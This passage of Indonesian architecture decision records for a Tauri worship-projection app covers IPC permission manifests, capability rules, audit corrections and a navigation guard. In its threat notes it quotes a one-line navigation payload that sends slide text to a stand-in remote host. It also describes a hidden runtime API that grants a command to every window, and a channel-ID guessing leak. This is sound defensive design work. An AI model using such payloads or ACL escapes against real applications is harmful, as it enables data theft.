...
**Koreksi 2026-08-27, dari audit SEC-01 (W5). Keputusan ini tetap benar; yang terlalu luas adalah kalimat yang repo ini bangun DI ATASNYA.** Empat berkas SEC-01 menyatakan bahwa dengan `dynamic-acl` mati **tidak ada jalan keluar runtime** sama sekali. Itu lebih luas daripada yang tauri jamin. `Context::runtime_authority_mut` (`tauri-2.11.5/src/lib.rs:478-482`) dan `RuntimeAuthority::__allow_command` (`ipc/authority.rs:136-146`) keduanya `pub` dan **tidak** digerbangi `#[cfg(feature = "dynamic-acl")]` — dan yang terakhir menyisipkan `windows: vec!["*"]`, yakni meng-grant ke **setiap** jendela termasuk `output`. Keduanya `#[doc(hidden)]`, bukan tidak ada. **Yang tetap berdiri, dan itu yang sesungguhnya keputusan ini beli:** `add_capability` menerima **string apa pun saat runtime**, sehingga permukaan sesungguhnya dapat berubah tanpa satu baris pun berubah di berkas mana pun. `__allow_command` menuntut **kode Rust yang di-commit**, jadi ia muncul di diff dan menuntut build ulang. Selisih itulah alasan ADR ini, dan selisih itu utuh. Yang salah adalah menyebutnya "tidak ada jalan keluar" alih-alih "tidak ada jalan keluar **tanpa build ulang**". **Bentuk kegagalan yang dijaga sekarang berbeda, dan lebih tenang:** sebuah item mendatang menulis `__allow_command("open_file", ExecutionContext::Local)` untuk "menghindari boilerplate permission". Perintah itu ter-grant ke semua jendela, `gen/schemas/*` tidak menyebutnya, dan tinjauan NFR-14 atas manifest melaporkan **nol** — sebab manifest memang tidak memuatnya. Penjaganya bukan lagi feature flag melainkan **grep**: guard inventaris sudah membaca `src-tauri/src/`, dan nol kemunculan kedua simbol itu terverifikasi hari ini. Menjadikan nol itu sebuah gate ternyata murah, dan **gate-nya mendarat di SEC-01 juga**: `findRuntimeAclEscapes` di `scripts/command-inventory-guard.js`, dipanggil runner atas setiap `.rs` di `src-tauri/src/`. Cakupan itu benar dan bukan kelalaian — `Context` harus disentuh sebelum `.run()`, dan itu hanya terjadi di sana. **Ia tidak sempurna:** audit verifikasi (V-W1) menemukan heuristik pelewatan komentarnya melewatkan bentuk `/* … */ kode` pada satu baris. Yang berlaku setelah perbaikan itu adalah: bentuk yang lazim memerah, dan kelasnya kini punya penjaga yang dapat diperketat — bukan bahwa jalur itu tertutup rapat.
...
**Koreksi kedua terhadap ADR-0014, dari SEC-01 (2026-08-27) — kalimat di atas kini basi, dan cara ia basi patut dibaca.** Sejak `src-tauri/permissions/` ada, `list_monitors` **tidak lagi** muncul nol kali di `gen/schemas/`: `acl-manifests.json` memuat kunci `__app-acl__` berisi `permissions["allow-list-monitors"].commands.allow = ["list_monitors"]`, dan `capabilities.json` menunjukkan `main-window` meng-grant-nya sementara `output-window` meng-grant nol. Diverifikasi dari artefak build nyata, termasuk `target/release/build/aeroworship-*/out/`, jadi biner yang dibundel memang membawanya. **Tetapi langkah 3 TIDAK dicabut, dan alasannya persis jenis ketelitian yang membuat koreksi pertama perlu:** yang kini terlihat di `gen/schemas/` adalah himpunan perintah yang **ter-grant**, bukan himpunan yang **terdaftar**. Perintah yang ada di `generate_handler!` tetapi tidak dinamai capability mana pun masih muncul nol kali di sana — bedanya, ia sekarang **mati** (ditolak saat invoke) alih-alih diam-diam terjangkau, dan yang menangkapnya sebelum build adalah daftar keempat `scripts/check-command-inventory.js`, bukan `gen/schemas/`. Jadi peninjau NFR-14 membaca **tiga** hal, dan masing-masing menjawab pertanyaan berbeda: `generate_handler!` = apa yang **ada**; `gen/schemas/acl-manifests.json` = apa yang **boleh dipanggil, oleh jendela mana**; guard inventaris = apakah kedua daftar itu **sepakat**. Sebelum SEC-01 hanya yang pertama yang dapat dijawab jujur.
...
**Ditutup penuh oleh SEC-01 (2026-08-27), dan premis judul ADR ini kini terbalik.** Judulnya berbunyi "perintah Tauri app-defined tidak ter-ACL" — sejak `src-tauri/permissions/list_monitors.json` ada, itu **tidak lagi benar untuk repo ini**. Gerbang di `webview/mod.rs` menyala begitu aplikasi punya manifest ACL sendiri, dan meninjau `capabilities/*.json` sekarang **memang** menampilkan perintah app-defined. Judul dibiarkan apa adanya karena ia benar pada tanggalnya dan berkas ini tidak menulis ulang sejarah; yang berubah dicatat di sini. **Yang bertahan dari ADR ini, dan justru menjadi lebih penting, adalah paragraf tentang himpunan ketiga.** Argumennya — bahwa perbandingan dua-sisi tetap hijau untuk arah yang berbahaya, sebab kedua sisi diedit dalam commit yang sama sehingga sepakat justru karena diedit bersamaan — berlaku sama persis pada himpunan **keempat**. Sebuah perintah baru ditambahkan ke definisi, ke handler, dan (oleh penulis yang tertib) ke inventaris; permission-nya adalah hal yang paling mudah dilupakan, dan melupakannya menghasilkan perintah yang **ditolak saat runtime dengan nol gate memerah**. Kegagalan sebaliknya lebih sunyi lagi: permission untuk perintah yang sudah dihapus menganggur selamanya tanpa gejala apa pun. SEC-01 menambahkan himpunan keempat karena alasan yang ADR ini tulis untuk himpunan ketiga.
...
> **Judul di atas memuat pemicu yang isi ADR ini sendiri CABUT** ("sesudah verifikasi runtime FR-102", dibatalkan 2026-08-15; lihat blok pemicu di bawah). Judul dibiarkan apa adanya karena berkas ini tidak menulis ulang sejarah — tetapi peringatan ini ditambahkan pada 2026-08-27 atas temuan audit SEC-01 (S6), sebab pemicu yang sudah dicabut itu **tetap disampaikan kepada pengguna dua kali** pada 27 Agustus oleh coordinator yang membaca judulnya dan tidak membaca badannya. Judul yang tidak ikut dikoreksi adalah permukaan yang paling mungkin membuatnya terulang.
...
**TERLAKSANA 2026-08-27 sebagai SEC-01, dan klausa pembatal di atas tidak pernah menyala — dengan selisih satu item.** Repo masih punya tepat **satu** perintah saat manifest dinyalakan; FR-202 akan mendaftarkan yang kedua. Jendela paling murahnya dipakai, bukan dilewatkan. **Dua kalimat dalam ADR ini terbukti tidak akurat saat dilaksanakan, dan keduanya dicatat alih-alih dirapikan.** (1) "Ia menyentuh `build.rs`" — tidak: `tauri_build::build()` melakukan glob atas `permissions/**/*` sendiri, sehingga **keberadaan direktori itulah saklarnya** dan nol baris build script kami berubah. Tebingnya karena itu lebih tajam daripada yang tertulis di sini: ia dilewati dengan `mkdir`, bukan dengan sebuah keputusan yang terlihat di `build.rs`. (2) "Jalan mundur yang jujur" berupa helper `webview.label() == "output"` tidak diperlukan dan tidak ditulis — mekanisme framework-nya bekerja, tujuh gate hijau termasuk `npm run tauri build`. **Yang tetap belum dijawab pada tanggal ini, dinyatakan supaya "terlaksana" tidak terbaca lebih luas daripada yang terbukti:** seluruh bukti sejauh baris ini bersifat build-time dan artefak. Bahwa jendela `output` **ditolak** masih pembacaan sumber sampai ronde tester menjadikannya assert, dan bahwa jendela `main` masih **berfungsi** pada mesin nyata hanya dapat dijawab pengguna. Gejala kegagalannya sudah dinamai di muka agar tidak salah dibaca sebagai cacat FR-101: daftar display kosong disertai pesan error di Control Panel, sementara jendela output tetap tampil normal.
...
1. **Tidak ada navigation handler pada jendela mana pun.** `pending.navigation_handler` bernilai `None`, dan `tauri-runtime-wry-2.11.4/src/lib.rs:4899-4906` hanya memasang `with_navigation_handler` bila handler itu ada — tanpa itu wry mengizinkan navigasi ke URL apa pun. CSP tidak menolong: tidak ada direktif yang mengatur navigasi top-level (`navigate-to` tidak diimplementasikan Chromium; `form-action 'none'` hanya menutup submit form). Konsekuensinya menyentuh **NFR-13**: `location = 'https://x/?' + document.body.innerText` mengirim isi slide keluar dan memindahkan layar proyektor ke halaman remote, dari aplikasi yang tidak punya satu baris kode jaringan pun.
   ...
   **Koreksi 2026-08-28, dari SEC-02: kesimpulan butir ini benar, MEKANISMENYA tidak — dan tuas yang salah adalah tuas yang tidak akan bekerja.** Kalimat di atas menyatakan `pending.navigation_handler` bernilai `None` **sehingga** `tauri-runtime-wry:4899-4906` tidak pernah memanggil `with_navigation_handler`. Paruh kedua itu keliru: `tauri-2.11.5/src/manager/webview.rs:580` menyetel `pending.navigation_handler = Some(Box::new(...))` **tanpa syarat** untuk setiap pending webview (diverifikasi coordinator langsung di sumber), jadi `with_navigation_handler` **selalu** terpasang. Yang bernilai `None` adalah handler **dalam** yang di-`take()` di `:577` — yang akan diisi `WebviewBuilder::on_navigation` — dan wrapper di `:590` bertanya kepada plugin store, yang tanpa plugin menjawab `true` untuk setiap URL. **Akibatnya identik, dan itulah yang membuat kekeliruan ini berbahaya alih-alih sepele:** siapa pun yang mengerjakan butir ini dengan membaca kalimat aslinya akan mencari cara mengisi `pending.navigation_handler`, yakni `WebviewWindowBuilder::on_navigation` — dan **bentuk itu secara struktural tidak dapat menjangkau jendela `main`**, sebab jendela itu lahir dari `tauri.conf.json` dan dibuat tauri sendiri di dalam `fn setup` (`app.rs:2524`), sehingga crate ini tidak pernah memegang builder-nya. Ia akan mengeraskan `output` saja, lulus setiap gate, dan meninggalkan separuh permukaan terbuka. **Tuas yang benar adalah hook `on_navigation` sebuah plugin**, yang dibaca **saat navigasi** dan bukan ditangkap saat pembuatan (`:594`), sehingga satu registrasi melayani kedua jendela dan urutan registrasi versus pembuatan jendela tidak jadi soal.

   **Dan estimasi "tiga baris" di bawah GAGAL sebagai hipotesis: hasilnya 66 baris kode.** Angka itu mengandaikan bentuk per-builder yang baru saja disebut — jadi ia bukan sekadar meleset, ia meleset **karena mengandaikan mekanisme yang salah**. Dua hal yang tidak muncul dalam bayangan tiga baris itu: predikat "internal" harus mencerminkan `AppManager::get_app_url` yang `pub(crate)` (dev memakai `build.devUrl`, rilis memakai origin protokol tauri), dan **navigasi pertama setiap jendela ikut lewat predikat itu** (`wry` `webview2/mod.rs`: `attach_handlers` di `:466`, satu-satunya `Navigate()` di `:531`, fungsi yang sama) — sehingga predikat yang salah tidak mengeraskan aplikasi melainkan **memutihkan proyektor**. Estimasi ukuran pada permukaan yang belum dibaca sumbernya adalah tebakan yang berpakaian angka; ini contohnya, dicatat di ADR yang melahirkannya.
...
### ADR-0051 — Konvensi manifest ACL: satu berkas per perintah, capability kosong yang ditulis, dan larangan glob pada capability yang meng-grant perintah app-defined

| | |
| --- | --- |
| Tanggal | 2026-08-27 |
| Status | Diterima |
| Terkait | SEC-01, NFR-13, NFR-14, NFR-16, [ADR-0013](decisions.md#adr-0013) · [ADR-0014](decisions.md#adr-0014) · [ADR-0039](decisions.md#adr-0039) · [ADR-0041](decisions.md#adr-0041) |

**Mengapa ADR dan bukan sekadar baris changelog.** SEC-01 menuntut empat keputusan bentuk yang tidak diatur PRD maupun ADR mana pun, diambil oleh implementer dan diterima lead secara sadar. Keempatnya akan disalin oleh setiap perintah berikutnya — Appendix D memuat sekitar 28 — jadi bentuk yang salah menjadi mahal secara monoton, persis seperti tebing yang ADR-0041 pakai sebagai argumen mengerjakan item ini sekarang.

**Keputusan 1 — satu berkas per perintah, dinamai persis nama perintah; identifier `allow-<nama-dengan-tanda-hubung>`.** `permissions/list_monitors.json` → `allow-list-monitors` → `commands.allow: ["list_monitors"]`. Ini bentuk yang ditulis `autogenerate_command_permissions` milik Tauri sendiri, sehingga pembaca yang mengenal Tauri mengenalinya, dan alat Tauri kelak tidak bertabrakan dengan konvensi karangan kami. Padanan `deny-` **tidak** ditulis selama tidak ada yang mereferensinya — permission ditambahkan oleh item yang FR-nya membutuhkannya, tidak pernah di muka, dan guard menolak permission yang tidak direferensi capability mana pun.

**Keputusan 2 — JSON, bukan TOML,** meski Tauri menerima keduanya. Alasannya bukan selera: guard inventaris harus **membaca** berkas ini, dan parser TOML adalah dependency baru yang menekan NFR-16 untuk nol kemampuan tambahan. Berkas `.toml`/`.json5` di `permissions/` atau `capabilities/` dilaporkan guard sebagai **problem**, bukan dilewati diam-diam — sebab berkas permission yang tak terbaca guard adalah berkas yang efektif tak terjaga.

**Keputusan 3 — capability yang meng-grant NOL tetap ditulis sebagai berkas.** `capabilities/output-window.json` berisi `"windows": ["output"]` dan `"permissions": []`. Ia tidak mengubah perilaku sedikit pun; menghapusnya kehilangan nol grant. Yang hilang adalah **pernyataannya**. Inilah pelajaran yang `PROGRESS.md` catat empat kali dan langgar sendiri selama dua belas hari pada baris SEC-01 dan SEC-02: *kewajiban yang dipindahkan ke ketiadaan bukan kewajiban yang dipindahkan.* Ketiadaan yang tidak ditulis tidak muncul di diff, tidak muncul di `gen/schemas/capabilities.json`, dan tidak dapat dibaca peninjau NFR-14 sebagai keputusan. Ditulis, ia muncul di ketiganya.

**Keputusan 4 — capability yang meng-grant perintah app-defined hanya boleh menamai label window LITERAL, dan tidak boleh menamai `output`.** Tanpa `* ? [ ] { }`. Ini kebijakan yang tidak ada di PRD maupun ADR mana pun, dan ia diterima karena satu alasan yang dapat diperiksa: **rekonsiliasi himpunan saja tidak menghentikan `"windows": ["*"]`.** Keempat daftar guard akan tetap sepakat sempurna — perintahnya terdefinisi, terdaftar, terinventaris, dan ter-grant — sementara satu karakter mengembalikan seluruh jangkauan IPC ke jendela output **tanpa gejala lain**. Itu persis keadaan yang SEC-01 ada untuk mengakhiri, dicapai lewat berkas yang seolah-olah benar. Guard karena itu memeriksa bentuk window list, bukan hanya keanggotaan himpunan. Label `output` di-hardcode di JS mengacu `OUTPUT_WINDOW_LABEL` di `services/display.rs`; bila label itu berubah dan JS tidak, guard berhenti menjaga hal yang benar — **itu utang yang dinyatakan, bukan yang disembunyikan.**

**Konsekuensi yang harus dibaca terang-terangan.** Jendela `output` kini juga tidak punya `core:event:default`. Hari ini nol regresi: bundel output tidak mengimpor API Tauri sama sekali. Tetapi PRD §6.5 menuntut jendela itu **mendengarkan** event kelak, dan pada hari itu `core:event:default` ditambahkan ke `output-window.json` **oleh item yang membutuhkannya dan bukan oleh yang lain**. Menambahkannya sekarang berarti meng-grant di muka, yang persis dilarang keputusan 1.

**Yang membatalkan keputusan ini.** Tauri memberi perintah app-defined pelingkupan per-window yang sesungguhnya (membuat keputusan 4 mubazir), atau alat resmi Tauri mulai menulis permission dalam bentuk yang bertabrakan dengan keputusan 1 dan 2 — pada titik itu mengikuti alatnya lebih murah daripada mempertahankan konvensi kami.


### ADR-0052 — Gerbang ACL punya satu perintah yang dikecualikan; kewajiban itu dipindahkan ke pemakai `Channel` pertama, bukan diselesaikan sekarang

| | |
| --- | --- |
| Tanggal | 2026-08-27 |
| Status | Diterima |
| Terkait | SEC-01, SEC-02, FR-105, NFR-13, NFR-14, [ADR-0013](decisions.md#adr-0013) · [ADR-0041](decisions.md#adr-0041) · [ADR-0042](decisions.md#adr-0042) · [ADR-0051](decisions.md#adr-0051) |

**Fakta, ditemukan audit SEC-01 di dalam kalimat yang SEC-01 tulis untuk menutup kelas cacat ini.** Lima berkas menyatakan absolut: setiap perintah yang tidak dinamai capability ditolak. Kondisi gerbang sesungguhnya (`tauri-2.11.5/src/webview/mod.rs:1823-1826`) berakhir `&& request.cmd != FETCH_CHANNEL_DATA_COMMAND && invoke.acl.is_none()`. Sitasi `:1823` dan `:1850` di kelima berkas itu **tepat**; klausa pengecualiannya duduk **di dalam** kondisi yang disitasi dan tidak disebut. Ini temuan **kesembilan** dari kelas cacat berulang repo ini, dan varian yang paling sulit dilihat: bukan sitasi yang salah, bukan angka yang dikarang, melainkan kalimat yang lebih luas daripada baris yang benar-benar ia tunjuk.

**Akibatnya, dinyatakan tanpa dilebihkan maupun dikecilkan.** `plugin:__TAURI_CHANNEL__|fetch` dapat dipanggil dari jendela `output` hari ini, melewati ACL sepenuhnya. **Dampaknya hari ini NOL**, dan bukan karena beruntung: aplikasi ini tidak membuat satu pun `Channel`, jadi `ChannelDataIpcQueue` selalu kosong dan permintaan itu tidak mengembalikan apa pun. Yang membuatnya berbahaya kelak adalah bentuk struktur datanya: `HashMap<u32, InvokeResponseBody>` **milik aplikasi, bukan milik webview** (`ipc/channel.rs:46,172,318-327`), id dari `AtomicU32` yang mulai dari 0, dan pembacaan **menghapus** entrinya. Jadi begitu sebuah `Channel` dipakai, jendela output dapat menebak id kecil, membaca payload yang ditujukan ke Control Panel, **dan sekaligus membuat pembaca sahnya kehilangan data** — satu panggilan yang membocorkan sekaligus merusak.

**Keputusan. Kewajiban dipindahkan ke item pertama yang memakai `Channel`, dan dituliskan di sini alih-alih dipercayakan pada ingatan.** Pemicunya bukan tanggal dan bukan milestone melainkan **konstruksi pertama sebuah `Channel`** — pemicu yang dapat diperiksa dengan grep, bukan yang harus diingat. Kandidat paling wajar adalah pelaporan progres impor FR-5xx dan payload besar mana pun. Item itu wajib menjawab: apakah pesan yang lewat `Channel` boleh dibaca jendela output, dan bila tidak, apa yang menghentikannya — sebab ACL, secara struktural, **tidak akan**.

**Mengapa tidak diselesaikan sekarang, dan ini alasan yang harus tahan dibaca ulang.** Tidak ada yang dapat diselesaikan: pengecualian itu ada di dalam `tauri`, bukan di kode kami, dan tidak ada capability, permission, atau konfigurasi yang mematikannya. Yang tersedia hanyalah tidak-memakai-`Channel` — yang **sudah** berlaku hari ini — atau menulis pembungkus terhadap sesuatu yang belum ada satu pun pemakainya, yang berarti mengarang bentuk sebelum kebutuhannya diketahui. [ADR-0041](decisions.md#adr-0041) menolak menambah permukaan yang belum dibutuhkan, dan alasan itu berlaku sama di sini.

**Tiga temuan lain ditunda bersama ini, masing-masing dengan pemilik bernama — sebab [ADR-0042](decisions.md#adr-0042) sudah membantah di muka bahwa cacat laten yang ditunda TANPA pemilik adalah bentuk yang diketahui gagal.**

1. **Aturan pola window hanya menyala untuk capability yang meng-grant permission app-defined** (`command-inventory-guard.js`, penjaga `appPermissions.length === 0` di dalam `resolveAppCommandGrants`; dikunci sengaja oleh test `leaves a capability that grants no app command alone` di `command-inventory-guard.test.js`). Maka `{"windows":["output"],"permissions":["core:webview:default"]}` lolos hijau, sementara `output-window.json` berbunyi jendela itu "granted **NOTHING**". Hari ini klaim itu benar; ia akan basi **tanpa gejala**. Pemilik: **SEC-02**, atau **FR-105** bila item itu lebih dulu menyentuh jendela output.
2. **Guard membaca `local` tanpa memakai nilainya** (`command-inventory-guard.js`, entri `local` di dalam `CAPABILITY_KEYS`; semantiknya di `tauri-utils/src/acl/resolved.rs:218-219`). `"local": false` pada `main-window.json` membuat capability tidak menghasilkan `ExecutionContext::Local` sama sekali — Control Panel mati sementara guard hijau dan keempat daftar sepakat. **Arahnya gagal-tertutup**, jadi ini bukan temuan keamanan melainkan satu-satunya field yang guard baca-tapi-abaikan. Pemilik: **SEC-02**.
3. **Premis "tidak ada jalan keluar runtime" dipersempit** — dicatat pada [ADR-0013](decisions.md#adr-0013) sendiri, bukan di sini, sebab di sanalah premisnya lahir.

**Koreksi 2026-08-28, dari audit verifikasi SEC-01 (V-W2), dan ia jatuh pada ADR yang menamai kelasnya sendiri.** Kedua butir di atas semula menyitir nomor baris (`:717-718`, `:387-395`). Keduanya **sudah basi ketika ADR ini ditulis**: angkanya disalin dari laporan audit ronde 1, lalu ronde 3 menyisipkan `findRuntimeAclEscapes` ke berkas yang sama dan menggeser keduanya beberapa puluh baris. `:717-718` berakhir menunjuk loop identifier duplikat — **aturan yang berbeda dan masuk akal**, yang justru berbahaya: pembaca menemukan sesuatu yang koheren di sana dan menyimpulkan ia sudah menemukan kewajibannya. Sitasi ketiga tetap tepat, dan campuran itulah yang membuatnya sulit dilihat. **Yang diperbaiki bukan angkanya melainkan bentuk alamatnya:** kedua butir kini menamai **simbol dan judul test**, yang berpindah bersama kodenya, alih-alih nomor baris, yang tidak. Ini kegagalan [ADR-0049](decisions.md#adr-0049) keputusan 3 pada langkah terakhirnya — kewajiban memang dicatat di tempat penerimanya akan membaca, tetapi alamat yang dicatat berhenti menunjuk ke sana. Sebuah kewajiban dengan alamat yang salah adalah kewajiban yang dipindahkan ke tempat yang tidak ada.

**Yang membatalkan keputusan ini.** `Channel` pertama dikonstruksi (saat itu kewajiban di atas jatuh tempo, bukan berpindah lagi), atau tauri melingkupi `FETCH_CHANNEL_DATA_COMMAND` per-webview — pada titik itu pengecualiannya hilang dan ADR ini menjadi catatan sejarah.


### ADR-0053 — Navigasi dijaga oleh hook plugin, bukan per-builder; allow-list origin diturunkan dari konfigurasi per-jendela, dan tiga jalur yang tidak dikonsultasi dinyatakan gagal-terbuka

| | |
| --- | --- |
| Tanggal | 2026-08-28 |
| Status | Diterima |
| Terkait | SEC-02, FR-105, NFR-13, NFR-16, NFR-34, PRD §6.1, [ADR-0008](decisions.md#adr-0008) · [ADR-0042](decisions.md#adr-0042) · [ADR-0049](decisions.md#adr-0049) · [ADR-0052](decisions.md#adr-0052) |

**Keputusan 1 — tuasnya hook `on_navigation` sebuah plugin, satu registrasi, bukan `WebviewWindowBuilder::on_navigation`.** Jendela `main` lahir dari `tauri.conf.json` dan dibuat tauri sendiri di dalam `fn setup` (`app.rs:2524`), sehingga crate ini **tidak pernah memegang builder-nya**. Bentuk per-builder karena itu **secara struktural tidak dapat menjangkau separuh permukaan** — ia akan mengeraskan `output`, lulus setiap gate, dan meninggalkan Control Panel terbuka. Plugin store dibaca **saat navigasi**, bukan ditangkap saat pembuatan, jadi satu registrasi melayani keduanya dan urutan registrasi versus pembuatan jendela tidak jadi soal. Koreksi mekanisme di [ADR-0042](decisions.md#adr-0042) butir 1 mencatat mengapa bentuk yang salah tampak benar.

**Keputusan 2 — allow-list origin (skema + host + port), diturunkan dari konfigurasi, dan diparameterkan per LABEL jendela.** Bukan deny-list: permukaan yang dijaga adalah "ke mana jendela ini boleh pergi", dan himpunan yang benar kecil dan diketahui, sedangkan himpunan yang salah tak terbatas. Label diperlukan karena `useHttpsScheme` adalah setelan **per-window** dan `Webview::use_https_scheme` `pub(crate)` — nilai efektifnya tidak dapat dibaca dari hook, jadi yang dibaca adalah **konfigurasi yang memproduksinya**. Konsekuensinya penting dan disengaja: menyalakan `useHttpsScheme` pada sebuah jendela di `tauri.conf.json` **tidak dapat memutihkan jendela itu diam-diam**.

**Keputusan 3 — origin TIDAK dibaca dari `Webview::url()`,** meski bentuk itu tidak butuh konfigurasi sama sekali dan tepat untuk jendela yang hanya pernah memuat halamannya sendiri. Alasannya adalah satu-satunya alasan yang cukup: ia **memperkuat dirinya ke arah yang salah**. Navigasi apa pun yang pernah lolos lewat salah satu residu di bawah menjadi origin yang predikat ini **bela** sejak saat itu — sebuah penjaga yang mengadopsi pelanggaran pertama sebagai kebijakannya.

**Keputusan 4 — perbandingan origin ditulis tangan; `Url::origin()` TIDAK dipakai, dan ini bukan selera.** `Url::parse("tauri://localhost").origin()` **tidak sama dengan dirinya sendiri** — dibuktikan dengan dijalankan, `is_tuple()` false, serialisasi `"null"` — sebab skema non-special menghasilkan origin **opaque**. Memakai API yang jelas itu akan menolak base URL aplikasi sendiri pada setiap platform non-Windows: **jendela putih dari kode yang terlihat lebih rapi.** Di-pin `assert_ne!` yang menyuruh pembaca memperbarui alasan ini bila `url` berubah, bukan menghapus barisnya.

**Keputusan 5 — tiga jalur yang tidak mengonsultasi penjaga ini dinyatakan, semuanya gagal-TERBUKA, dan enumerasinya sengaja DIBIARKAN TERBUKA.** (a) Wrapper tauri membaca `webviews_lock()` dan menjawab `true` bila label belum ada; peta itu diisi `attach_webview` **sesudah** `Navigate()`, jadi navigasi **pertama** setiap jendela mungkin tidak sampai ke sini — dan peta yang sama dikosongkan saat jendela ditutup. (b) Adaptor wry memakai `.unwrap_or(true)`, jadi URI yang gagal di-parse **diizinkan tanpa ditanya**; himpunan itu diyakini kosong tetapi **tidak kosong secara konstruksi**, dan sebuah test mem-pin-nya agar `url` yang kelak menerima salah satunya datang sebagai test merah. (c) `NewWindowRequested` tidak lewat sini sama sekali — ia dijatuhkan **oleh wry**, bukan oleh modul ini. Enumerasi dibiarkan terbuka sebab repo ini sudah **empat kali** dilukai enumerasi tertutup, dan audit SEC-02 menemukan permukaan **kelima** (nol download handler) yang keempat-empatnya tidak sebut — kini milik **FR-105**.

**Keputusan 6 — diagnostik penolakan mencetak label dan origin saja, TIDAK URL utuh.** Serangannya adalah `location = 'https://x/?' + document.body.innerText`: **query string itu sendiri adalah teks lirik**. Mencetak URL utuh akan menyalin konten ibadah ke log, satu-satunya hal yang NFR-34 larang. Residunya dinyatakan alih-alih diabaikan: nama **host** dapat mengkodekan konten (`<base32>.example.com`), jadi klaim "tanpa konten" berlaku untuk path dan query, bukan host — dan diagnostik tanpa host tidak memberi tahu penyelidik ke mana jendela dikirim, yang merupakan seluruh nilai barisnya. **Nol rate limiter dibangun:** limiter adalah keputusan kebijakan logging, dan itu milik item yang memberi repo ini log (NFR-34).

**Penempatan: predikat tinggal di crate shell, dan itu TIDAK melanggar PRD §6.1.** Butir 1 berbunyi *"lives in **Rust**, is unit-tested, and is shared by both windows"* — bukan "lives in `aeroworship-core`" — dan ketiganya terpenuhi. Alasan yang **salah** dan sempat ditulis adalah [ADR-0008](decisions.md#adr-0008) ("core tidak boleh bergantung pada tauri"): `tauri::Url` **adalah** `pub use url::Url`, jadi core dapat menerima `&url::Url` tanpa menyentuh tauri sama sekali. Alasan yang benar **NFR-16** — satu dependency langsung baru ke core demi satu predikat tidak sepadan.

**Yang membatalkan keputusan ini.** Tauri mengekspos nilai efektif `use_https_scheme` per-webview (keputusan 2 menjadi lebih sederhana dan tidak lagi bergantung pada konfigurasi), atau tauri mengonsultasi plugin store **sebelum** `Navigate()` pertama (residu (a) hilang dan klaim tentang navigasi pertama dapat ditegakkan alih-alih dinyatakan), atau `url` mulai memberi origin non-opaque untuk skema non-special (keputusan 4 menjadi mubazir).
